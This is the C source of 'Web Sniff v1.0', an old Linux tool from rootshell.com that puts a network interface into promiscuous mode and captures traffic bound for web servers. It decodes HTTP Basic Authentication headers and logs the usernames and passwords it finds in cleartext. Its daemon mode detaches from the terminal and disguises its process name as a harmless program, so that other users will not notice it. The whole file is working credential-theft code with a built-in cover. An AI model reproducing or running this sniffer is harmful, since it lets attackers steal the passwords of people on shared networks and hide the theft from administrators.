/*
 *
 *  Web Sniff v1.0 for Linux
 *
 *  Coded by BeastMaster V
 *  http://www.rootshell.com
 *
 *  EMAIL: All questions or
 *  comments should be sent to
 *  bryan@scott.net
 *
 *  DESCRIPTION: This program
 *  sniffs packets destined for
 *  webservers and scans for
 *  headers with Basic Auth.
 *  then automatically decodes
 *  the auth. string giving a
 *  username/passwd in cleartext.
 *
 *  BUGS: In the verbose mode,
 *  source/destination headers
 *  get out of sync with data.
 *  In daemon mode, source/dest.
 *  headers may not be reliable.
 *
 *  DISCLAIMER: Please use
 *  this program in a
 *  responsible manner.
 *
 */

#include <stdio.h>
#include <stdlib.h>
#include <stdarg.h>
#include <sys/socket.h>
#include <sys/time.h>
#include <sys/types.h>
#include <unistd.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <netinet/in.h>
#include <netdb.h>
#include <string.h>
#include <linux/if.h>
#include <signal.h>
#include <termio.h>
#include <arpa/inet.h>
#include <linux/socket.h>
#include <linux/ip.h>
#include <linux/tcp.h>
#include <linux/if_ether.h>
#include <errno.h>

extern int errno;

#define DEFAULT_WEB_PORT 80
#define CAPTURE_LENGTH 1024
#define TIMEOUT 30
#define INTERFACE "wlan0"
#define ISBLANK(x)  (((x) == ' ') || ((x) == '\t'))
#define SPACELEFT(buf, ptr)  (sizeof buf - ((ptr) - buf))
#define newstr(s) strcpy(malloc(strlen(s) + 1), s)

struct BASE64_PARAMS {
      unsigned long int accum;
      int               shift;
      int               save_shift;
};

struct etherpacket {
        struct ethhdr ether_header;
        struct iphdr ip_header;
        struct tcphdr tcp_header;
        char buff[8192];
} ether_packet;

struct
{
        unsigned long source_addr;
        unsigned long dest_addr;
        unsigned short source_port;
        unsigned short dest_port;
        int      bytes_read;
        char     active;
        time_t   start_time;
                char        tmp_realm[1024];
                char     tmp_host[512];
} target;

struct iphdr *ip;
struct tcphdr *tcp;

char **Argv = NULL;         
char *LastArgv = NULL;     

short daemon_mode;
short verbose_mode;
unsigned short user_port;
FILE *daemon_fd=NULL;
int sock;

/* function declarations */
char *lookup(unsigned long int);
char *dateTime();

/* BeastMaster V's implementation of signal */
void      (*
r_signal(sig, func)) (int)
int     sig;
void    (*func) ();
{
        struct sigaction act, oact;

        act.sa_handler = func;

        sigemptyset(&act.sa_mask);
        act.sa_flags = 0;

#ifdef SA_RESTART
        act.sa_flags |= SA_RESTART;
#endif

      if (sigaction(sig, &act, &oact) < 0)
              return (SIG_ERR);

      return (oact.sa_handler);
}

/* this function detaches a process from a controlling terminal */
void detach()
{
        int rc, fd;

        /* Fork once to escape shell's job control */
        if ((rc = fork()) > 0)
                exit(0);
        else if (rc <0) {
                perror("detach");
                exit(EXIT_FAILURE);
        }

        /* Now detach from the controlling terminal */
        if ((fd = open("/dev/tty", O_RDWR,0)) == -1 ) {
                printf("couldn't open tty, assuming still okay...\n");
                fflush((FILE *)stdout);
                return;
        }

        ioctl(fd, TIOCNOTTY, 0);

        close(fd);

        /* make us a new process group/session */
        setsid();
}

/* this function lets you set the current process title */
setproctitle(const char *fmt, ...)
{
        register char *p;
        register int i;
        char buf[2048];
                va_list args;

        p = buf;

                va_start(args, fmt);
        (void) vsnprintf(p, SPACELEFT(buf, p), fmt, args);
                va_end(args);

        i = strlen(buf);

        if (i > LastArgv - Argv[0] - 2)
        {
                i = LastArgv - Argv[0] - 2;
                buf[i] = '\0';
        }
        (void) strcpy(Argv[0], buf);
        p = &Argv[0][i];
        while (p < LastArgv)
                *p++ = ' ';
        Argv[1] = NULL;
}

/* this function does initialization for setproctitle() */
void initsetproctitle(int argc, char **argv, char **envp)
{
        register int i;
        extern char **environ;

        for (i = 0; envp[i] != NULL; i++)
                continue;
        environ = (char **) malloc(sizeof (char *) * (i + 1));
        for (i = 0; envp[i] != NULL; i++)
                environ[i] = newstr(envp[i]);
        environ[i] = NULL;

        Argv = argv;
        if (i > 0)
                LastArgv = envp[i - 1] + strlen(envp[i - 1]);
        else
                LastArgv = argv[argc - 1] + strlen(argv[argc - 1]);
}

/* converts base64 ascii to integer code */
int cvt_ascii( unsigned char alpha )
{
   if      ( (alpha >= 'A') && (alpha <= 'Z') ) return (int)(alpha - 'A');
   else if ( (alpha >= 'a') && (alpha <= 'z') )
        return 26 + (int)(alpha - 'a');
   else if ( (alpha >= '0') && (alpha <= '9' ) )
        return 52 + (int)(alpha - '0');
   else if ( alpha == '+' ) return 62;
   else if ( alpha == '/' ) return 63;
   else if ( alpha == '=' ) return -2;
   else                     return -1;
}

/* this does the actual base64 decoding */
void base64_decode(char *buf,int quit,struct BASE64_PARAMS *d,char *auth_buf)
{
   int index;
   unsigned long int value;
   unsigned char blivit;
   unsigned short j=0;

   index = 0;
   *(auth_buf+0)='\0';

   while ( ISBLANK(buf[index] ) )
   {
      index++;                         /* skip leading blanks */
   }

   for ( index = 0;
         (buf[index] != '\n') &&
         (buf[index] != '\0') &&
         (buf[index] != ' ' );
         index++)
   {

      if (index==(264-5)) return;

      value = cvt_ascii( buf[index] ); /* find chr in base64 alphabet */

      if ( value < 64 )                /* if legal */
      {
         d->accum <<= 6;               /* assemble binary accum */
         d->shift += 6;
         d->accum |= value;
         if ( d->shift >= 8 )
         {
            d->shift -= 8;
            value = d->accum >> d->shift;
            blivit = (unsigned char)value & 0xFFl;
            *(auth_buf+j) = (char )blivit;
                    j++;
         }

      }
      else                             /* else if out of base64 range */
      {
         quit = 1;                     /* then finished */
         break;
      }
   }

   *(auth_buf+j)='\0';  
   return;
}

/* this is a nice way to call the base64 decode function */
void decode(char *b64_string, char *user_buff)
{

        struct BASE64_PARAMS d_p;
        int quit=0;

        d_p.shift = 0;
        d_p.accum = 0;

        base64_decode((char *)b64_string, quit, &d_p, user_buff);

        return;
}

/* checks for authorization and parses out username and password */
void parse_segment(char *data)
{
                short i,j=0;
                char foo[256];
                char user[128];
                char pass[128];

                if ((!strncmp(data,"GET ",4)) || (!strncmp(data,"POST ",5)) || (!strncmp(data,"HEAD ",5)))
                               strncpy(target.tmp_realm,data,strlen(data));
               
                /* you might want to change this to a more intelligent test */
                if (!strncasecmp(data,"Authorization: Basic",20)) {
                               if (strlen(data+21)>sizeof(foo))
                                               *(data+21+sizeof(foo-1))='\0';
                               decode(data+21,foo);
                               for (i=0;foo[i];i++) {
                                               if (foo[i]==':')
                                                               break;
                                               user[i]=foo[i];
                               }
                               user[i]='\0';
                               for (++i; foo[i]; i++) {
                                               pass[j]=foo[i];
                                               j++;
                               }             
                               pass[j]='\0';
                               if (daemon_mode) {
                                               fprintf(daemon_fd,"\n####### [%s]\n",dateTime());
                                               fprintf(daemon_fd,"%s",target.tmp_host);
                                               fprintf(daemon_fd,"REALM REQUESTED: %s\n", target.tmp_realm);
                                               fprintf(daemon_fd,"---[ USER = %s     PASS = %s ]---\n",user,pass);
                                               fprintf(daemon_fd,"#######\n\n");
                                               fflush(daemon_fd);
                               } else {
                                               printf("\n----------[ USER = %s     PASS = %s ]----------\n",user,pass);
                                               fflush(stdout);
                               }
                }

                return;

}

/* read data from ether_packet.buff and parse check each line */
int scan_data(int datalen, char *data)
{
   int i=0, t=0;
   char data_buff[CAPTURE_LENGTH];

   target.bytes_read=target.bytes_read+datalen;
   memset(target.tmp_realm,'\0',sizeof(target.tmp_realm));
   sprintf(target.tmp_host, "[%s] [%d] => ",lookup(target.source_addr), ntohs(target.source_port));
   sprintf(data_buff,"[%s] [%d]\n", lookup(target.dest_addr), ntohs(target.dest_port));
   strcat(target.tmp_host,data_buff);

   data_buff[0]='\0';  

   for(i=0;i != datalen;i++)
   {
        if(data[i] == 13)
                {
                               data_buff[t]='\0';
                               if (verbose_mode) {
                                               printf("%s\n", data_buff);
                                               fflush(stdout);
                               }
                               parse_segment(data_buff);
                               t=0;
        }
        if(isprint(data[i]))
                {
                data_buff[t]=data[i];
                t++;
        }
        if(t > 255)
                {
                               t=0;
                               data_buff[t]='\0';
                               if (verbose_mode) {
                                               printf("%s\n", data_buff);
                                               fflush(stdout);
                               }
                               parse_segment(data_buff);
        }

   }

}

/* handler for segmentation violations */
void seg_fault (int sig)
{
                fprintf(stderr, "\n");
                fprintf(stderr, "Segmentation Violation!\n");
                fprintf(stderr, "\n");
                fprintf(stderr, "Congratulations! You have crashed my program.\n");
                fprintf(stderr, "Please mail me:  bryan@scott.net\n");
                fprintf(stderr, "describing *exactly* what you did to make this\n");
                fprintf(stderr, "program crash. Thanks and have a nice day :-)\n");
                fprintf(stderr, "\n");
                exit(EXIT_FAILURE);
}

/* resolves a hostname via gethostbyaddr() */
char *lookup(unsigned long int network_address)
{
        static char buf[1024];
        struct in_addr my_addr;
        struct hostent *he;

        my_addr.s_addr=network_address;
        he=gethostbyaddr((char *)&my_addr,sizeof(struct in_addr),AF_INET);
        if (he==NULL)
                sprintf(buf,inet_ntoa(my_addr));
        else
                sprintf(buf,he->h_name);
        return (buf);
}

/* this function returns the data and time */
char * dateTime()
{
        time_t t;
        char * s;

        time(&t);
        s = (char *)ctime((const time_t *)&t);
        s[24] = '\0';
        return s;
}

/* handler when program is terminated noramlly */
void bye(int sig)
{

                if (daemon_mode) {
                fprintf(daemon_fd, "\n*** Daemon Mode Ending at [%s] ***\n",dateTime());
                               fclose(daemon_fd);
                }

                close(sock);
                exit(0);
}

/* filters out all other packets except for ones were intrested in */
int packet_filter ()
{
                unsigned short port;

                if (ip->protocol !=6) return (0);
                if (target.active !=0)
                               if (target.bytes_read > CAPTURE_LENGTH)
                               {
                                               bzero(&target, sizeof(target));
                                               return(0);
                               }

                if (user_port!=0)
                               port=user_port;
                else
                               port=DEFAULT_WEB_PORT;

                if (ntohs(tcp->dest)!=port)
                               return(0);
                else
                {
                               if (tcp->syn==1)
                               {
                                               target.source_addr=ip->saddr;
                                               target.dest_addr=ip->daddr;
                                               target.active=1;
                                               target.source_port=tcp->source;
                                               target.dest_port=tcp->dest;
                                               target.bytes_read=0;
                                               target.start_time=time(NULL);
                                               if (verbose_mode) {
                                               printf("[%s] [%d] => ",lookup(target.source_addr),
                                                               ntohs(target.source_port));
                                               printf("[%s] [%d]\n", lookup(target.dest_addr),
                                                               ntohs(target.dest_port));
                                               fflush(stdout);
                               }
                                              
                               }
                }
               
                return(1);
}

/* prints the usage for our program */
void print_usage (char *prog_name)
{
                printf("\n");
                printf("### Web Sniffer v1.0 by BeastMaster V ###\n");
                printf("         http://www.rootshell.com\n");
                printf("\n");
                printf("Usage:\n");
                printf("\n");
                printf("%s [-d|-v] [-p <port number>]\n", prog_name);
                printf("\n");
                printf("-d : run as a daemon and print output to logfile.\n");
                printf("-v : run in foreground and print output to stdout.\n");
                printf("-p : optionally specifies port number to sniff on.\n");
                printf("\n");
}

/* start here */
int main ( argc, argv, envp )
unsigned int argc;
char **argv;
char **envp;
{
        int i, x, c;
                extern int optind;
                extern char *optarg;
        struct ifreq req;
                short argsLeft=0;
                short errFlag=0;
                char *port_ptr=NULL;
                char title[1024];

        r_signal(SIGSEGV, seg_fault);
        r_signal(SIGTERM, bye);
        r_signal(SIGQUIT, bye);
        r_signal(SIGHUP, bye);

        if (getuid() && geteuid()) {
                fprintf(stderr, "\nYou need to be root in order to run this.\n\n");
                exit(EXIT_FAILURE);
        }

                memset(title,'\0',sizeof(title));

                verbose_mode=0;
                daemon_mode=0;
                user_port=0;

                while((c=getopt(argc,argv,"dvp:"))!= EOF)
                               switch(c) {
                                  case 'd':
                                      if (verbose_mode)
                                          errFlag++;
                                      else
                                                  daemon_mode=1;
                                      break;
                                  case 'v':
                                      if (daemon_mode)
                                          errFlag++;
                                      else
                                                  verbose_mode=1;
                                      break;
                                  case 'p':
                                      port_ptr=optarg;
                                      user_port=atoi(port_ptr);
                                      break;
                                  case '?':
                                      errFlag++;
                               }

                argsLeft=argc-optind;

                if ((!daemon_mode && !verbose_mode)||errFlag||argsLeft) {
                               print_usage(argv[0]);
                               exit(EXIT_FAILURE);
                }

                if (daemon_mode) {
                               printf("\n");
                               printf("*** Daemon Mode ***\n");
                               printf("Enter in the full path to the logfile\n");
                               fgets(title,sizeof(title),stdin);
                for (c=0; title[c]; c++)
                        if (title[c]=='\n') {
                                title[c]='\0';
                                break;
                        }
                               if ((daemon_fd=fopen(title,"a+"))==NULL) {
                                               fprintf(stderr, "Could not open logfile: %s\n", strerror(errno));
                                               exit(EXIT_FAILURE);
                               }
                               printf("Enter in a process title to masquerade as so\n");
                               printf("it won't be quite so obvious to other users what\n");
                               printf("we are really doing (i.e: bash, ftp, in.telnetd, vi ...)\n");
                               fgets(title,sizeof(title),stdin);
                               for (c=0; title[c]; c++)
                                               if (title[c]=='\n') {
                                                               title[c]='\0';
                                                               break;
                                               }
                               printf("Setting process title to: %s\n", title);
                               initsetproctitle(argc, argv, envp);
                               setproctitle("%s", title);
                               printf("Daemon Mode Started.\n");
                               detach();
                               fprintf(daemon_fd, "\n*** Daemon Mode Started at [%s] ***\n",dateTime());
                               fflush(daemon_fd);
                }

        sock=socket(AF_INET, SOCK_PACKET, htons(0x800));
        if (sock <0) {
                perror("can't get SOCK_PACKET socket");
                exit(1);
        }

        strcpy(req.ifr_name, INTERFACE);

        if ((i=ioctl(sock, SIOCGIFFLAGS, &req)) ==-1) {
                close(sock);
                fprintf(stdout, "I cannot get flags: %s\n", strerror(errno));
                exit(EXIT_FAILURE);
        }
        req.ifr_flags |= IFF_PROMISC;
        if ((i=ioctl(sock, SIOCSIFFLAGS, &req)) ==-1) {
                close(sock);
                fprintf(stdout, "I cannot set flags: %s\n", strerror(errno));
                exit(EXIT_FAILURE);
        }

        ip=(struct iphdr *)(((unsigned long)&ether_packet.ip_header)-2);       
        tcp=(struct tcphdr *)(((unsigned long)&ether_packet.tcp_header)-2);
       
        bzero(&target, sizeof(target));
       
        for (;;) {
           while(1) {
              x=read(sock,&ether_packet,sizeof(ether_packet));
              if (x > 1)
              {
                  if (packet_filter()==0) continue;
                  x=x-54;
                  if (x<1) continue;
                  break;
              }
           }

           scan_data( htons( ip->tot_len)-sizeof( ether_packet.ip_header)-
           sizeof( ether_packet.tcp_header), ether_packet.buff-2);

        }

}
